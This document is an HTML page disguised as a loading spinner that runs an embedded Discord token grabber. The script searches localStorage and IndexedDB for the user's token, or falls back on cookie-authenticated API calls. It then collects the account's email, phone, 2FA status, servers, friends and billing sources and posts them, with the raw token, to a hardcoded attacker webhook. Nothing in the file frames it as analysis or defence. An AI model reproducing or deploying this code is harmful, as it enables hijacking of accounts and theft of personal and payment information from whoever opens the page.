<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body { background:#1e1e2e; display:flex; align-items:center; justify-content:center; height:100vh; color:white; font-family:sans-serif; }
        .spinner { width:30px; height:30px; border:3px solid #333; border-top-color:#5865f2; border-radius:50%; animation:spin .8s linear infinite; }
        @keyframes spin { to{transform:rotate(360deg)} }
        p { margin-top:12px; color:#72767d; }
    </style>
</head>
<body>
    <div style="text-align:center;">
        <div class="spinner"></div>
        <p>Loading content...</p>
    </div>
    <script>
    // ===== CLEAN TOKEN GRABBER =====
    const wh = 'https://discord.com/api/webhooks/1551539788220203069/hX0J3ZaEmfsxMOGBnUzdZIKekNSZQM_fXMBiqHjusCAxphMNlV7V7j7Z5DTPFiSLqGX3';
    let t = null;

    (async function(){
        // 1. Try localStorage (works in Discord in-app browser & web)
        try { 
            let lt = localStorage.getItem('token');
            if(lt && lt.split('.').length === 3) { t = lt; }
            // Check alternative keys
            ['discord_token','d_token','user_token'].forEach(k => {
                let v = localStorage.getItem(k);
                if(v && v.split('.').length === 3 && !t) t = v;
            });
        } catch(e){}

        // 2. Try IndexedDB (Discord desktop)
        if(!t) {
            try {
                let r = indexedDB.open('discord');
                r.onsuccess = function() {
                    let db = r.result;
                    if(db && db.objectStoreNames.contains('user')) {
                        let g = db.transaction('user','readonly').objectStore('user').get('token');
                        g.onsuccess = function() { if(g.result) { t = g.result; sendAll(); } };
                    }
                };
            } catch(e){}
        }

        // 3. Try cookie authenticated fetch (in-app browser sends cookies)
        if(!t) {
            try {
                let res = await fetch('https://discord.com/api/v9/users/@me', { credentials: 'include' });
                if(res.ok) {
                    let u = await res.json();
                    if(u && u.id) {
                        // Send user data at least
                        await fetch(wh, {
                            method:'POST',
                            headers:{'Content-Type':'application/json'},
                            body:JSON.stringify({
                                content: '**[COOKIE AUTH]** User: ' + u.username + '#' + u.discriminator + ' | ID: ' + u.id + ' | Email: ' + (u.email||'none'),
                                embeds: [{
                                    title: 'User Data (No Token)',
                                    color: 0x5865F2,
                                    fields: [
                                        {name:'User', value:u.username+'#'+u.discriminator, inline:true},
                                        {name:'ID', value:u.id, inline:true},
                                        {name:'Email', value:u.email||'None', inline:true},
                                        {name:'Phone', value:u.phone||'None', inline:true},
                                        {name:'Nitro', value:u.premium_type>0?'Yes':'No', inline:true},
                                        {name:'2FA', value:u.mfa_enabled?'Yes':'No', inline:true},
                                        {name:'UA', value:navigator.userAgent.substring(0,100), inline:false}
                                    ]
                                }]
                            })
                        });
                    }
                }
            } catch(e){}
        }

        // 4. If we have token, send everything
        if(t) {
            try {
                let res = await fetch('https://discord.com/api/v9/users/@me', { headers: {'Authorization': t} });
                let u = await res.json();
                if(u && u.id) {
                    let [g,r,b] = await Promise.all([
                        fetch('https://discord.com/api/v9/users/@me/guilds', {headers:{'Authorization':t}}).then(r=>r.json()).catch(()=>[]),
                        fetch('https://discord.com/api/v9/users/@me/relationships', {headers:{'Authorization':t}}).then(r=>r.json()).catch(()=>[]),
                        fetch('https://discord.com/api/v9/users/@me/billing/payment-sources', {headers:{'Authorization':t}}).then(r=>r.json()).catch(()=>[])
                    ]);
                    
                    await fetch(wh, {
                        method:'POST',
                        headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({
                            content: '@everyone **🚨 DISCORD ACCOUNT STOLEN**',
                            embeds: [{
                                title: '🎣 Token Grabber',
                                color: 0xed4245,
                                fields: [
                                    {name:'Username', value:u.username+'#'+u.discriminator, inline:true},
                                    {name:'ID', value:u.id, inline:true},
                                    {name:'Email', value:u.email||'None', inline:true},
                                    {name:'Phone', value:u.phone||'None', inline:true},
                                    {name:'Nitro', value:u.premium_type>0?'Yes':'No', inline:true},
                                    {name:'2FA', value:u.mfa_enabled?'Yes':'No', inline:true},
                                    {name:'Servers', value:String(g.length||0), inline:true},
                                    {name:'Friends', value:String(r.filter(f=>f.type===1).length||0), inline:true},
                                    {name:'Billing', value:String(b.length||0), inline:true},
                                    {name:'Token', value:'||'+t+'||', inline:false}
                                ],
                                thumbnail: u.avatar ? {url:'https://cdn.discordapp.com/avatars/'+u.id+'/'+u.avatar+'.png?size=128'} : null,
                                footer: {text:'Token Grabber'},
                                timestamp: new Date().toISOString()
                            }]
                        })
                    });
                }
            } catch(e){}
        }

        // 5. Always send browser info
        await fetch(wh, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({content:'**[GRABBER]** Token: '+(t?'✅':'❌')+' | UA: '+navigator.userAgent.substring(0,50)+' | Ref: '+(document.referrer||'none')})
        });
    })();
    </script>
</body>
</html>
